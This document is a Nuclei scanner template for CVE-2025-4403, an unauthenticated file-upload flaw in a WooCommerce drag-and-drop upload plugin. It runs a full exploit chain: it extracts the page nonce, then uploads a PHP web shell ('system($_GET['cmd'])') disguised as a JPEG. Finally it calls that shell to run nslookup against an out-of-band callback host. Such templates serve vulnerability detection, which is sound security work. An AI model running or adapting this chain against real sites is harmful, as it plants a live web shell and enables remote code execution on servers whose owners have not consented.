id: cve-2025-4403

info:
  name: Drag and Drop Multiple File Upload for WooCommerce < 1.1.7 - Unauthenticated RCE
  author: Eslam Abu Bakr @eabubakr21
  severity: critical
  description: |
    An unauthenticated arbitrary file upload vulnerability exists in the "Drag and Drop Multiple File Upload for WooCommerce"
    WordPress plugin (versions <= 1.1.6). An attacker can exploit this to upload a malicious PHP file and achieve
    Remote Code Execution on the server. This template chains the nonce extraction, file upload, and OAST-based
    verification to confirm the vulnerability.
  reference:
    - https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/drag-and-drop-multiple-file-upload-contact-form-7/drag-and-drop-multiple-file-upload-for-woocommerce-116-unauthenticated-arbitrary-file-upload
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2025-4403
    cwe-id: CWE-434
  tags: cve,cve2025,wordpress,wp-plugin,rce,file-upload,oob

# A multi-step request chain to exploit the vulnerability.
requests:
  # Step 1: Fingerprint the plugin and extract the nonce.
  - method: GET
    path:
      - "{{BaseURL}}"

    matchers:
      # First, check if the vulnerable plugin is active to reduce noise.
      - type: word
        part: body
        words:
          - "wp-content/plugins/drag-and-drop-multiple-file-upload-contact-form-7"
        internal: true # This matcher is for logic, not a final finding.

    extractors:
      # Extract the nonce required for the upload request.
      - type: regex
        name: nonce
        part: body
        group: 1
        regex:
          - '"nonce":"([a-f0-9]+)"'
        internal: true

  # Step 2: Upload the malicious PHP file using the extracted nonce.
  - method: POST
    path:
      - "{{BaseURL}}/wp-admin/admin-ajax.php"

    headers:
      Referer: "{{BaseURL}}"

    # Define the multipart form data for the upload, mirroring the PoC script.
    body: |
      ------WebKitFormBoundary
      Content-Disposition: form-data; name="action"

      dnd_codedropz_upload_wc
      ------WebKitFormBoundary
      Content-Disposition: form-data; name="_ajax_nonce"

      {{nonce}}
      ------WebKitFormBoundary
      Content-Disposition: form-data; name="supported_type"

      .
      ------WebKitFormBoundary
      Content-Disposition: form-data; name="size_limit"

      99999999999999999999999999
      ------WebKitFormBoundary
      Content-Disposition: form-data; name="dnd-wc-upload-file"; filename="pwn.php."
      Content-Type: image/jpeg

      <?php system($_GET['cmd']); ?>
      ------WebKitFormBoundary--

    matchers:
      # Check if the upload was successful by looking for the JSON response with a file path.
      - type: word
        part: body
        words:
          - '"data":{"file":"'
        condition: and

      - type: status
        status:
          - 200

    extractors:
      # Extract the name of the uploaded file to use in the next step.
      - type: regex
        name: uploaded_file
        part: body
        group: 1
        regex:
          - '"file":"([^"]+)"'
        internal: true

  # Step 3: Trigger the uploaded PHP file to verify RCE via OAST.
  - method: GET
    path:
      - "{{BaseURL}}/wp-content/uploads/wc_drag-n-drop_uploads/tmp_uploads/{{uploaded_file}}?cmd=nslookup {{interactsh-url}}"

    matchers:
      # A successful DNS callback to Interact.sh confirms RCE.
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
